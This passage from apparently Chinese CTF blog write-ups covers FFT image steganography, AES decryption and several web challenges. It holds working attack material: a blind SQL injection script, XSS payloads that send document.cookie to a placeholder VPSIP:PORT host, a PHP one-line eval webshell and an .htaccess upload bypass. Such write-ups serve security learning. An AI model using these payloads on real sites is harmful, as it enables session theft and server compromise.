data_max - data_min new_interval = up - down new_data = (data - data_min) * new_interval / interval + down new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p if __name__ == '__main__': os.mkdir('m') os.mkdir('p') os.mkdir('frame') os.system('ffmpeg -i secret.mp4 frame/%03d.png') files = os.listdir('frame') r_file = open('r', 'wb') for file in files: img = cv2.imread(f'frame/{file}', cv2.IMREAD_GRAYSCALE) m, p = fft(img) r_file.write(struct.pack('!ff', m.min(), m.max())) new_img1 = mapping(m) new_img2 = mapping(p) cv2.imwrite(f'm/{file}', new_img1) cv2.imwrite(f'p/{file}', new_img2) r_file.close() os.system('ffmpeg -i m/%03d.png -r 25 -vcodec png 1.mkv') os.system('ffmpeg -i p/%03d.png -r 25 -vcodec png 2.mkv') 可以发现把视频切分得到每一帧，然后 FFT 得到幅度m和相位p，再合并得到两个视频。文件 r 里存了每一帧中幅值的最大和最小值。 那咱就反过来，通过幅值和相位的视频切分得到每一帧，然后 IFFT 变换回去就完事了。 相位范围就是 -pi 到 pi 之间。 写个脚本。 \"\"\" MiaoTony \"\"\" import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def unmapping(data_min, data_max, data, down=0, up=255, tp=np.uint8): interval = data_max - data_min new_interval = up - down new_data = (data-down) * interval / new_interval + data_min # new_data = (data - data_min) * new_interval / interval + down # new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(m, p): x = np.exp(m)*np.exp(1j*p) y = np.fft.ifftshift(x) img = np.real(np.fft.ifft2(y)) img = img.astype(np.uint8) # print(img) return img if __name__ == '__main__': # os.mkdir('m') # os.mkdir('p') # os.mkdir('frame') # os.system('ffmpeg -i 1.mkv m/%03d.png') # os.system('ffmpeg -i 2.mkv p/%03d.png') r_file = open('r', 'rb') s = r_file.read() r_file.close() print(s) m_data = [] for i in range(len(s)//8): x = struct.unpack('!ff', s[i*8:(i+1)*8]) # print(x) # min, max m_data.append(x) files = os.listdir('m') for idx, file in enumerate(files): m_img = cv2.imread(f'm/{file}', cv2.IMREAD_GRAYSCALE) p_img = cv2.imread(f'p/{file}', cv2.IMREAD_GRAYSCALE) m_min, m_max = m_data[idx] m = unmapping(m_min, m_max, m_img) p = unmapping(-np.pi, np.pi, p_img) img_raw = ifft(m, p) # plot(img_raw) # show() cv2.imwrite(f'frame/{file}', img_raw) 在还原后的视频的最后，得到压缩包的解压密码 zs6hmdlq5ohav5l1 challenge 2hint.txt 是个 MathML &lt;math&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;mo&gt;⟶&lt;/mo&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;math&gt; 也就是 意思是幅值不变，而相位相互交换。 另外给了两张图 第二张明显有个二维码，脚本整一个！ \"\"\" MiaoTony \"\"\" import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(m, p): x = np.exp(m)*np.exp(1j*p) y = np.fft.ifftshift(x) img = np.real(np.fft.ifft2(y)) img = img.astype(np.uint8) # print(img) return img if __name__ == '__main__': img1 = cv2.imread(f'mix1.png', cv2.IMREAD_GRAYSCALE) img2 = cv2.imread(f'mix2.png', cv2.IMREAD_GRAYSCALE) m1, p1 = fft(img1) m2, p2 = fft(img2) new_img1 = ifft(m1, p2) new_img2 = ifft(m2, p1) cv2.imwrite('new1.png', new_img1) cv2.imwrite('new2.png', new_img2) 其中一张里面就看出二维码了。 再稍微调一下图像的曲线。 扫码得到 0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f 唔，IFFT 那步应该取模值而不是直接取实部，也就是改成 img = np.abs(np.fft.ifft2(y)) 这样得到的图片就不会丢失虚部的信息了。 final challenge 根据文件名称，盲猜是相位上有猫腻。 首先将幅值调整到 -pi 到 pi 之间，当作相位，作傅里叶反变换，最后再归一化到 0 到 255 之间，画出图像。 import os import cv2 import struct import numpy as np from matplotlib.pyplot import plot, show def mapping(data, down=0, up=255, tp=np.uint8): data_max = data.max() data_min = data.min() interval = data_max - data_min new_interval = up - down new_data = (data - data_min) * new_interval / interval + down new_data = new_data.astype(tp) return new_data def fft(img): fft = np.fft.fft2(img) fft = np.fft.fftshift(fft) m = np.log(np.abs(fft)) p = np.angle(fft) return m, p def ifft(p): x = np.exp(1j*p) y = np.fft.ifftshift(x) img = np.abs(np.fft.ifft2(y)) return img if __name__ == '__main__': img = cv2.imread(f'phase.png', cv2.IMREAD_GRAYSCALE) # print(img.max(), img.min()) p = mapping(img, -np.pi, np.pi, tp=np.float64) img_raw = ifft(p) img2 = mapping(img_raw) cv2.imwrite('final.png', img2) 得到 AESKEY: a8bms0v4qer3wgd67ofjhyxku5pi1czl 而后用 AES ECB 模式解密 from Crypto.Cipher import AES key = \"a8bms0v4qer3wgd67ofjhyxku5pi1czl\" aes = AES.new(key, AES.MODE_ECB) cipher = binascii.unhexlify( \"0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f\") flag = aes.decrypt(cipher) print(flag) # b'flag{1ba48c8b-4eca-46aa-8216-d164538af310}\\x06\\x06\\x06\\x06\\x06\\x06' flag{1ba48c8b-4eca-46aa-8216-d164538af310} 草，果然是 CV 带师，把傅里叶变换各种折腾，喵喵是 fw，咱自己爬（（ Webfind_itrobots.txt 泄露，访问 1ndexx.php 报500，后打开 .1ndexx.php.swp 拿到源码，phpinfo 页面拿到 flag code=&lt;?php phpinfo();?&gt; frameworkwww.zip 拿到源码 yii 反序列化漏洞 RCE CVE-2020-15148 https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP 魔改 exp file_put_contents 上传马，然后蚁剑连上后绕过 disable_function，拿到 flag WebsiteMangerimage.php?id= 存在注入 import requests passwd = '' for i in range(1, 100): for j in range(48, 103): url = 'http://eci-2zeir5o8p6vh97bek411.cloudeci1.ichunqiu.com/image.php?id=if(ascii(substr((select/**/group_concat(password)/**/from/**/users),{},1))={},1,0)'.format( i, j) r = requests.get(url) if(r.content): print(chr(j)) passwd += chr(j) print(passwd) continue # e845b14ae11ff886a2f72 admin / e845b14ae11ff886a2f72 登录 而后 SSRF file:///flag 拿到 flag 小结喵喵好菜啊，喵呜呜。 写论文好烦啊，太难受啦！ 还是摸鱼舒服。 （溜了溜了","path":"2021/05/24/CTF_2021RedHat/"},{"title":"CTF | 2021 NUAACTF Easy_XSS 复现","text":"本文首发于先知社区：https://xz.aliyun.com/t/9516 引言在 NUAACTF 2021 中，有一道 XSS 相关的题目 Easy_XSS，比赛的时候就只有一队做出来了。 （当然只是校内玩玩而已，大师傅们应该随便就 AK 了 Orz 题目考点主要涉及 XSS 绕过、PHP 代码审计、文件上传绕过等，难度其实还好。 最近几天摸鱼，就来复现一下吧。 顺便还拓展学习了一下 iframe 标签中的 srcdoc 属性在 XSS 中的利用。 题目描述 Easy XSS 尝试去获取管理员的神秘页面 upload.php 吧！ http://45.76.221.54:8005 解题步骤Step 01 收集环境信息打开题目发现是个 Blog，可以在里面发 post。 发 post 需要登录，那就先随意注册个账户。 根据题目描述，直接访问 upload.php，会提示需要 admin 才能上传。 啊，居然没有前端界面，只有丑丑的源代码 可是有源代码吼啊！ 那就看看怎么获取 admin 权限好了。 Step 02 XSS 及其绕过既然是 XSS 嘛，那就想到先试试 img 标签好了。 先构造一个最普通的，利用 url 来传递 cookie。 自己的 VPS 上起个 web 服务来接收一下，或者如果有 NGINX 的话看看 log 也行。 payload: meow &lt;img src='#' onerror=\"window.location.href='//VPSIP:PORT/'+document.cookie\"&gt; 233 然而发现 img window document on 被替换为空了，location -&gt; locati。 那就试试双写绕过行不行。 meow &lt;imimgg src='#' oonnerror=\"windwindowow.locatioonn.href='//VPSIP:PORT/'+documdocumentent.cookie\"&gt; 23333 很好，成功构造出了预期的 xss 语句，实现了跳转。 接下来就勾上 Publish this post，让 admin 看一看，顺便偷走他的 cookie。 成功在 VPS 上接收到 cookie。 PHPSESSID=9f767556e4ef66825cb9e3b399e5d243 而后修改 cookie，刷新页面就是 admin 了。 Step 03 PHP 文件上传绕过再回到开始的 /upload.php，发现此时页面上空空如也，确实是 admin 了。 没有前端上传界面，那下面就直接审计 PHP 源码再自己构造上传请求吧。 &lt;?php require_once 'init.php'; error_reporting(0); if ($_SESSION['is_admin'] !== 1) { echo \"You are not admin! You can't access this page.\"; highlight_file(__FILE__); die(); } $userdir = \"uploads/\" . md5($_SERVER[\"REMOTE_ADDR\"]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } if (isset($_POST[\"submit\"])) { $tmp_name = $_FILES[\"upload\"][\"tmp_name\"]; $name = basename($_FILES[\"upload\"][\"name\"]); if (!$tmp_name) { die(); } if (!$name) { die(\"filename cannot be empty!\"); } $extension = substr($name, strrpos($name, \".\") + 1); if (preg_match(\"/ph/i\", $extension)) { die(\"illegal suffix!\"); } $upload_file_path = $userdir . \"/\" . $name; if (!move_uploaded_file($tmp_name, $upload_file_path)) { die(\"Error!\"); } echo \"Your dir \" . $userdir . ' &lt;br&gt;'; echo \"Your file: \"; var_dump(scandir($userdir)); } 参考 PHP 手册：POST 方法上传 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置，且对大小写敏感。 于是 $extension 就是根据文件名中最后一个 . 之后的字符得到文件的扩展名，如果包含 ph 的话就会被拦住了。 另外，触发上传的话需要用 POST 方法，且包含一个 submit 变量，值的话随意设置就好了。 先准备个一句话木马，存为 miao.png。 &lt;?php @eval($_GET['miao']);?&gt; 当然 POST 也行。 Python 写个脚本上传。 import requests url = \"http://45.76.221.54:8005/upload.php\" headers = { 'cookie': 'PHPSESSID=9f767556e4ef66825cb9e3b399e5d243' } form_data = { 'submit': (None, '1'), # 'upload': (f'.htaccess', open(f'.htaccess', 'rb')) 'upload': (f'miao.png', open(f'miao.png', 'rb')) } print(form_data) resp = requests.post(url, headers=headers, files=form_data, timeout=10) resp.encoding = 'utf-8' print(resp.content) 上传之后发现不能执行 PHP 脚本。 做的时候试了试 %00 截断 test.php%00.png、1.php(0x00)/1.png 之类的，发现都不行。 再回去看看题目环境，PHP 7.4.0 + Apache 2.4.38。 考虑到服务器用了 Apache，可以试试上传一个 .htaccess 文件，让文件夹里所有后缀的文件都交给 PHP 来处理。 SetHandler application/x-httpd-php 这样就能通过上传不带有 ph 后缀的文件来执行 php 代码了。 当然也可以在 .htaccess 里这么写，也就是给 .png 文件指定用 PHP 来处理。 AddType application/x-httpd-php .png 根据得到的路径进行访问，然后用一句话木马去拿 flag。 成功拿到 flag，好耶！ flag{851f398a-3db1-4299-8dd6-6a3d2467433f} 拓展一下看看源码那顺便再来看看他源码好了。 发现 post.php 在渲染页面的时候，有一个过滤。 具体是 function render_tags($str) { $str = preg_replace('/script|img|svg|on|document|window/i', \"\" ,$str); return $str; } 那其实还能直接用 iframe 来整，不过原理差不多倒是了。 &lt;iframe src=javascript:alert('xss');&gt;&lt;/iframe&gt; 改改过滤把关键词替换为 hacker 试试，即 function render_tags($str) { $str = preg_replace('/script|img|svg|on|document|window/i', \"hacker\" ,$str); return $str; } 这样一下子难度就上来了。包含这些关键词的标签以及 onxxxx 属性都不能用了。 （其实这题出题人最开始过滤方法就这样的，后来觉得太难了就改成替换为空了。 但是这样还有个 iframe 可以写入 src 呢。 首先构造 payload &lt;script&gt;top.location.href='//VPSIP:PORT/'+document.cookie&lt;/script&gt; 配合 data 协议以及 base64 编码，写入到 src 里。 &lt;iframe src=\"data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb24uaHJlZj0nLy9WUFNJUDpQT1JULycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+\"&gt;&lt;/iframe&gt; 然而打过去发现被拦住了…… 也就是说 data 里不能拿到 document.cookie。 再来看 iframe 标签还有什么神奇的属性呢？ 参考 HTML &lt;iframe&gt; 标签的 srcdoc 属性 ，我们可以在 srcdoc 属性中直接写入 HTML 源码。 为了防止被替换掉，这里可以用 HTML entity 编码一下。 &lt;iframe srcdoc=\"&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#47;&amp;#47;&amp;#86;&amp;#80;&amp;#83;&amp;#73;&amp;#80;&amp;#58;&amp;#80;&amp;#79;&amp;#82;&amp;#84;&amp;#47;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;\"&gt;&lt;/iframe&gt; 打过去，成功收到 cookie。 好耶！ 小结复现完了耶！ 这篇文章从 NUAACTF 2021 Easy_XSS 一题入手，对整个解题过程进行了复现。 题目考点主要包括 XSS 绕过、PHP 代码审计、文件上传绕过，总体而言难度还好。 在拓展部分，对于过滤替换为其他字符的情况进行了分析，进一步考虑了 iframe 标签中的 srcdoc 属性在 XSS 中的利用。 Extensive Reading.htaccess利用与Bypass方式总结 文件上传漏洞（绕过姿势） XSS总结 （溜了溜了喵~","path":"2021/05/17/CTF_2021NUAACTF_EasyXSS/"},{"title":"CTF | 2021 蓝帽杯 Misc 冬奥会_is_coming WriteUp","text":"引言 第五届蓝帽杯全国大学生网络安全技能大赛 比赛时间: 2021-04-29 09:00 ~ 15:00 比赛官网: https://bcs.qianxin.com/bluehatcup/index/index#/ 五一之前打了个蓝帽杯，这里就摸鱼随意写一道 Misc 题目的 WriteUp 好了。 Misc冬奥会_is_coming拼接隐写，分离出一个 rar。 备注提示八位数，联系题目冬奥会，应该是 2022 北京冬奥会开幕的日子吧。 用 MP3Stego 解密。 MP3StegoDecode.exe -X encode.mp3 -P 20220204 得到 \\xe2\\x9c\\x8c\\xef\\xb8\\x8e \\xe2\\x98\\x9d\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x98\\x9f\\xef\\xb8\\x8e\\xe2\\x97\\x86\\xef\\xb8\\x8e\\xe2\\x99\\x8c\\xef\\xb8\\x8e \\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x97\\xbb\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\x9d\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8e\\xef\\xb8\\x8e \\xf0\\x9f\\x93\\x82\\xef\\xb8\\x8e\\xe2\\x99\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xf0\\x9f\\x8f\\xb1\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e \\xe2\\x9d\\x96\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x91\\xef\\xb8\\x8e\\xf0\\x9f\\x93\\xac\\xef\\xb8\\x8e \\xf0\\x9f\\x95\\x88\\xef\\xb8\\x8e\\xe2\\x99\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5\\xe2\\x99\\x8f\\xef\\xb8\\x8e \\xe2\\x99\\x8b\\xef\\xb8\\x8e \\xe2\\x97\\x8f\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x9c\\x8d\\xef\\xb8\\x8e 拿 python 解码一下。 s=b'\\xe2\\x9c\\x8c\\xef\\xb8\\x8e \\xe2\\x98\\x9d\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x98\\x9f\\xef\\xb8\\x8e\\xe2\\x97\\x86\\xef\\xb8\\x8e\\xe2\\x99\\x8c\\xef\\xb8\\x8e \\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x97\\xbb\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\x9d\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8e\\xef\\xb8\\x8e \\xf0\\x9f\\x93\\x82\\xef\\xb8\\x8e\\xe2\\x99\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xf0\\x9f\\x8f\\xb1\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e \\xe2\\x9d\\x96\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x91\\xef\\xb8\\x8e\\xf0\\x9f\\x93\\xac\\xef\\xb8\\x8e \\xf0\\x9f\\x95\\x88\\xef\\xb8\\x8e\\xe2\\x99\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5\\xe2\\x99\\x8f\\xef\\xb8\\x8e \\xe2\\x99\\x8b\\xef\\xb8\\x8e \\xe2\\x97\\x8f\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x9c\\x8d\\xef\\xb8\\x8e' print(s.decode()) # ✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎ WingDing 编码，在 https://lingojam.com/WingDing 这里在线解码一下。 A︎ G︎i︎t︎H︎u︎b︎ r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎ n︎a︎m︎e︎d︎ 1︎c︎e︎P︎e︎a︎k i︎s︎ v︎e︎r︎y︎ i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎ W︎h︎y︎ n︎o︎t︎ t︎a︎ke︎ a︎ l︎o︎o︎k a︎t︎ i︎t︎?︎ WingDing 编码表 在 GitHub 上找到了 https://github.com/Tr0jAnV1rU4/1cePeak 这个仓库。 https://github.com/Tr0jAnV1rU4/1cePeak/blob/main/A/post-checkout 又想到在 mp3 结尾有个 cipher Hex 解码出来是一堆 emoji 考虑是 emoji-aes 加密 https://aghorler.github.io/emoji-aes/ （或者用咱自己搭的 https://emoji-aes.miaotony.xyz/ 也行 用 How_6ad_c0uld_a_1cePeak_be? 作为 Key 去解密，拿到 flag。 flag{e32f619b-dbcd-49bd-9126-5d841aa01767} 小结喵，摸鱼真舒服。 转眼之间就到五月份了啊。 这个月有点忙不能摸鱼了，喵呜呜呜呜呜呜。 （溜了溜了喵","path":"2021/05/09/CTF_2021BlueHat/"},{"title":"CTF | 2021 MRCTF WriteUp","text":"引言 2021 MRCTF https://2021.mrctf.fun/ 比赛时间 2021-04-10 9：00 - 2021-4-11 21：00 比赛规则 单人解题赛 前几天看北邮 天璇Merak 战队整了个招新赛，喵喵也来随便玩玩好了！ 什么鬼招新赛嘛，怎么巨大多 check in 题目，然而喵喵并不能 check in…… 喵呜，题目还是比较顶的，喵喵确实也不会做什么，大哭。 REReal_CHECKIN直接丢进 IDA 发现只有一个 entry，看来是加壳了。 丢进 FUPX 里一看，果然加了 UPX 壳。 脱一下壳，再扔进 IDA。 tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq== 直接拿去 base64 解码发现是乱码。看来是魔改的 base64 了。 发现编码表里 大小写反过来了……草！ 于是大小写反过来，改一下编码表，再拿去 base64 解码就能拿 flag 了。 MRCTF{wElc0Me_t0_MRCTF_2o21!!!} Extensive Reading: 爆破非默认Base64编码表 Cryptofriendly_sign-in ez sign-in, just come and get the flag! nc node.mrctf.fun 10007 Mirrors: host, port = ‘nairw.top’, 4800 https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH 源码 from Crypto.Util.number import * from hashlib import sha512 from random import choices from flag import flag import string Bits = 512 length = len(flag) * 8 def proof_of_work() -&gt; bool: alphabet = string.ascii_letters + string.digits head = \"\".join(choices(alphabet, k=8)) print(f'POW: SHA512(\"{head}\" + ?) starts with \"11111\"') tail = input().strip() message = (head + tail).encode() return sha512(message).hexdigest().startswith(\"11111\") def check_ans(_N, _x) -&gt; bool: check = 0 for i in range(len(_N)): check += _N[i] * _x[i] return check == 0 def main(): if not proof_of_work(): return print(\"Welcome to MRCTF2021, enjoy this friendly sign-in question~\") flag_bits = bin(bytes_to_long(flag.encode()))[2:] N = [getPrime(Bits) for _ in range(length)] print('N =', N) X = [] for i in range(length): x = [int(input().strip()) for _ in range(length)] if x in X: print('No cheat!') return if x.count(0) &gt; 0: print('No trivial!') return if not check_ans(N, x): print('Follow the rule!') return X.append(x) print('your gift:', flag_bits[i]) main() 其实这个思路很简单，只需要生成 不重复 每个数都不为0 对应位置数字的乘积累加和为0 这样的序列就可以了。 那么怎么生成呢？ 其实只需要任意 (length/2) 对数字交换一下，正负号交替一下，就能实现乘积累加和为 0 了。 那怎么不重复呢？ 喵喵想了有一段时间，到最后一想，直接随机产生下标，把映射关系存一下，要是已经存在了冲突了就重新产生就完事了呀！ 另外有个麻烦的地方就是交互吧，输入 224*224 个数字，跑起来都挺久的…… Exp: from pwn import * from Crypto.Util.number import * from hashlib import sha512 from random import choices import string from tqdm import tqdm from pwnlib.util.iters import mbruteforce sh = remote('nairw.top', 4800) context.log_level = 'debug' def proof_of_work(sh): sh.recvuntil(\"SHA512(\\\"\") head = sh.recv(8) # .decode('utf-8') print(\"head:\", head) sh.recvuntil('with \\\"11111\\\"') for a in tqdm(range(0x30, 0x7f)): for b in range(0x30, 0x7f): for c in range(0x30, 0x7f): for d in range(0x30, 0x7f): rest = chr(a) + chr(b) + chr(c) + chr(d) m = (head.decode('utf-8') + rest).encode(\"utf-8\") if sha512(m).digest().hex().startswith(\"11111\"): print('\\nrest:', rest) sh.sendline(rest) # sh.recvuntil('again...God bless you get it...') return # proof = mbruteforce(lambda x: sha512((head + x).encode('utf-8')).hexdigest().startswith( # \"11111\"), string.ascii_letters + string.digits, length=4, method='fixed') # print('rest:', proof) # sh.sendline(proof) def generate_idx(length): \"\"\" 随机生成对换的下标 dict \"\"\" idx_list = list(range(length)) idx_result = {} for _ in range(length//2): while True: r = choices(idx_list)[0] t = choices(idx_list)[0] if r != t: # print(r, t) # 一半正 一半负 idx_result[r] = [t, 